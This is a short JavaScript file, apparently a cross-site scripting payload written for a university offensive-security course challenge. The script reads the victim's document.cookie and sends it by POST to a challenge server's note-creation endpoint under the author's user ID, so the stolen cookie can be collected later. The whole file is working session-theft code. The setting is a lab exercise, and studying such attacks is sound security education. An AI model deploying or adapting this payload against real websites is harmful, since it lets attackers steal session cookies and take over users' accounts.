// Define the URL of the API endpoint
const url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new";

const old_cookie = document.cookie;

// Create a new Date object to represent the current date and time
const currentTime = new Date();

// Get the individual components of the time (hours, minutes, seconds)
const hours = currentTime.getHours().toString().padStart(2, '0'); // Add leading zero if needed
const minutes = currentTime.getMinutes().toString().padStart(2, '0');
const seconds = currentTime.getSeconds().toString().padStart(2, '0');

// Construct the time string in your desired format (e.g., HH:MM:SS)
const timeString = `${hours}:${minutes}:${seconds}`;

// Define request headers
const headers = {
  'Content-Type': 'application/x-www-form-urlencoded',
};

// Perform a POST request with cookies and payload
fetch(url, {
  method: 'POST',
  'Cookie': 'CHALBROKER_USER_ID=pv2160',
  'body': "title=test1001" + timeString + "&content=" + old_cookie + "&submit=save",
  headers: headers,
  credentials: 'omit', // This prevents sending cookies
});
